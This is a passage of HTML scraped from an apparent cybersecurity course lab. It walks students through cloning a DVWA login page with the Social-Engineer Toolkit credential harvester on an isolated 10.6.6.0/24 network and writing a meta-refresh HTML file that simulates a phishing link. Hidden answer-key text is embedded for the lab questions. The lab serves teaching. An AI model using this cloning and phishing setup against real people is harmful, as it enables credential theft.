+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c100c6b521b0d00a5f45d-heading-view" headingtitle="What is the URL of the login screen?" modelid="645c100c6b521b0d00a5f45d" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->What is the URL of the login screen?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->What is the URL of the login screen?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->DVWA.vm/login.php
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645c10776b521b0d00a5f45f" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645c10776b521b0d00a5f45f" class="645c10776b521b0d00a5f45f block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645c10776b521b0d00a5f45f" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c10776b521b0d00a5f45f-heading-view" headingtitle="Part 2 Step 2" modelid="645c10776b521b0d00a5f45f" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645c10776b521b0d00a5f460" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645c10776b521b0d00a5f460" class="component text 645c10776b521b0d00a5f460 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c10776b521b0d00a5f460-heading-view" headingtitle="Part 2 Step 2" modelid="645c10776b521b0d00a5f460" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><ol start="2" style="list-style-type:lower-alpha"><li><!--[if !supportLists]-->Return to the terminal session. Select <strong>2) Site Cloner</strong> from the <strong>Credential Harvester Attack Method</strong> menu. Information describing which IP address is needed to host the fake website and to receive the POST data is displayed. Enter the web attacker IP address at the prompt. This is the IP address of the virtual Kali internal interface on the 10.6.6.0/24 network. In an actual exploit, this would be the external (internet facing) address of the attack computer.</li><li><!--[if !supportLists]-->At the prompt, enter the IP address <strong>10.6.6.1</strong>.</li></ol><pre style="margin-left:40px">set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [10.0.2.15]:<strong>10.6.6.1</strong></pre><ol start="4" style="list-style-type:lower-alpha"><li><!--[if !supportLists]-->Next, enter the URL of the website that you want to clone. This is the URL of the DVWA website, <strong>http://DVWA.vm</strong>.</li></ol><pre style="margin-left:40px">[-] SET supports both HTTP and HTTPS</pre><pre style="margin-left:40px">[-] Example: http://www.thisisafakesite.com</pre><pre style="margin-left:40px">set:webattack&gt; Enter the url to clone:<strong>http://DVWA.vm</strong><strong> </strong>
+</pre><pre style="margin-left:40px">[*] Cloning the website: http://DVWA.vm</pre><pre style="margin-left:40px">[*] This could take a little bit...</pre><ol start="5" style="list-style-type:lower-alpha"><li><!--[if !supportLists]-->When the website is cloned, the following message appears on the terminal.</li></ol><pre style="margin-left:40px">The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.</pre><pre style="margin-left:40px">[*] The Social-Engineer Toolkit Credential Harvester Attack</pre><pre style="margin-left:40px">[*] Credential Harvester is running on port 80</pre><pre style="margin-left:40px">[*] Information will be displayed to you as it arrives below:</pre><p style="margin-left:40px"><strong>Note</strong>: No prompt will be returned to you. This is because a listener is now active on port 80 on the Kali computer and all port 80 traffic will be redirected to this screen. Do not close the terminal window. Continue to Part 3.</p></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645c3fa7a7bd1810b141a4c3" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645c3fa7a7bd1810b141a4c3" class="645c3fa7a7bd1810b141a4c3 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645c3fa7a7bd1810b141a4c3" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c3fa7a7bd1810b141a4c3-heading-view" headingtitle="Part 3 Step 1" modelid="645c3fa7a7bd1810b141a4c3" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645c3fa7a7bd1810b141a4c4" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645c3fa7a7bd1810b141a4c4" class="component text 645c3fa7a7bd1810b141a4c4 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c3fa7a7bd1810b141a4c4-heading-view" headingtitle="Part 3 Step 1" modelid="645c3fa7a7bd1810b141a4c4" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h2 style="margin-left:0in"><!--[if !supportLists]--><span><span>Part 3: </span></span><!--[endif]-->Capturing and Viewing User Credentials</h2><h3 style="margin-left:0in"><!--[if !supportLists]--><span><span>Step 1: </span></span><!--[endif]-->Create the Social Engineering Exploit.</h3><p>In a “real-life” exploit, at this point, a phishing exploit containing a link or QR code that sends the user to the fake website is created and sent. In this lab, an html document is created to direct the user to the fake webpage. This document simulates a distributed phishing URL. It could be distributed as a file attachment in phishing emails.</p><ol start="1" style="list-style-type: lower-alpha;"><li><!--[if !supportLists]--><!--[endif]-->Open the Kali Linux Mousepad text editor using the <strong>Applications &gt; Favorites &gt; Text Editor</strong> choice from the menu. Enter the HTML code shown into the Mousepad document.</li></ol><pre style="margin-left: 40px;"><strong><span>&lt;html&gt;</span></strong></pre><pre style="margin-left: 40px;"><strong><span>&lt;head&gt;</span></strong></pre><pre style="margin-left: 40px;"><strong><span>&lt;meta http-equiv="refresh" content="0; url=http://10.6.6.1/" /&gt;</span></strong></pre><pre style="margin-left: 40px;"><strong><span>&lt;/head&gt;</span></strong></pre><pre style="margin-left: 40px;"><strong><span>&lt;/html&gt;</span></strong></pre><ol start="2" style="list-style-type: lower-alpha;"><li><!--[if !supportLists]-->Select <strong>File &gt; Save</strong> from the Mousepad menu. Name the document <strong>Great_link.html</strong> and save it in the <strong>/home/kali/Desktop</strong> Folder. The icon appears on the Kali desktop.</li><li><!--[if !supportLists]--><!--[endif]-->Close the Mousepad application.</li></ol></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645c412fa7bd1810b141a4c6" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645c412fa7bd1810b141a4c6" class="645c412fa7bd1810b141a4c6 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645c412fa7bd1810b141a4c6" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c412fa7bd1810b141a4c6-heading-view" headingtitle="Part 3 Step 2" modelid="645c412fa7bd1810b141a4c6" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645c4130a7bd1810b141a4c7" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645c4130a7bd1810b141a4c7" class="component text 645c4130a7bd1810b141a4c7 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c4130a7bd1810b141a4c7-heading-view" headingtitle="Part 3 Step 2" modelid="645c4130a7bd1810b141a4c7" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h2 style="margin-left:0in"><!--[if !supportLists]--></h2><h3 style="margin-left:0in"><!--[if !supportLists]--><span><span>Step 2: </span></span><!--[endif]-->Capture User Credentials.</h3><p>The purpose of the cloned website is to present a web page that looks identical to the one that the user is expecting. A good hacker would create a fake URL that would be very similar to the actual URL, so that unless the user inspects the URL very closely, it would go unnoticed.</p><ol start="1" style="list-style-type:lower-alpha"><li><!--[if !supportLists]--><!--[endif]-->Double-click the desktop icon for the <strong>Great_link.html</strong> page. The DVWA login page that you viewed in <strong>Part 2, Step 2a</strong> should appear in a browser window.</li></ol></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645c4134f651250d5d331701" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645c4134f651250d5d331701" class="645c4134f651250d5d331701 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645c4134f651250d5d331701" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c4134f651250d5d331701-heading-view" headingtitle="Part 3 Step 2" modelid="645c4134f651250d5d331701" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645cf77f90a1060e5b785146" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645cf77f90a1060e5b785146" class="component opentextbox 645cf77f90a1060e5b785146 remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645cf77f90a1060e5b785146" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645cf77f90a1060e5b785146-heading-view" headingtitle="What URL appears on the browser now? Is it the same as the URL you recorded in Part 2, Step 2a?" modelid="645cf77f90a1060e5b785146" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->What URL appears on the browser now? Is it the same as the URL you recorded in Part 2, Step 2a?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->What URL appears on the browser now? Is it the same as the URL you recorded in Part 2, Step 2a?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->The URL is http://10.6.6.1/ is displayed in the browser. No, they are not the same as in the previous part.
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645cf7d256b1381146ea4548" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645cf7d256b1381146ea4548" class="645cf7d256b1381146ea4548 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645cf7d256b1381146ea4548" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645cf7d256b1381146ea4548-heading-view" headingtitle="Part 3 Step 2" modelid="645cf7d256b1381146ea4548" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645cf7d256b1381146ea4549" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645cf7d256b1381146ea4549" class="component text 645cf7d256b1381146ea4549 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645cf7d256b1381146ea4549-heading-view" headingtitle="Part 3 Step 2" modelid="645cf7d256b1381146ea4549" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><ol start="2" style="list-style-type: lower-alpha;"><li><!--[if !supportLists]-->Enter some information in the Username and Password fields and click <strong>Login</strong> to send the form.</li></ol><pre style="margin-left: 40px;">Username: <strong>some.user@gmail.com</strong></pre><pre style="margin-left:40px">Password: <strong>Pa55w0rdd!</strong></pre></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645d013664a5f11194732b8c" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645d013664a5f11194732b8c" class="645d013664a5f11194732b8c block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645d013664a5f11194732b8c" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d013664a5f11194732b8c-heading-view" headingtitle="Part 3 Step 2" modelid="645d013664a5f11194732b8c" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 3 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645d013664a5f11194732b8d" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645d013664a5f11194732b8d" class="component opentextbox 645d013664a5f11194732b8d remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645d013664a5f11194732b8d" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645d013664a5f11194732b8d-heading-view" headingtitle="What is the URL after you entered the information and clicked the Login button? Is it the same as the URL you recorded in Part 2, Step 2a?" modelid="645d013664a5f11194732b8d" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->What is the URL after you entered the information and clicked the Login button? Is it the same as the URL you recorded in Part 2, Step 2a?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
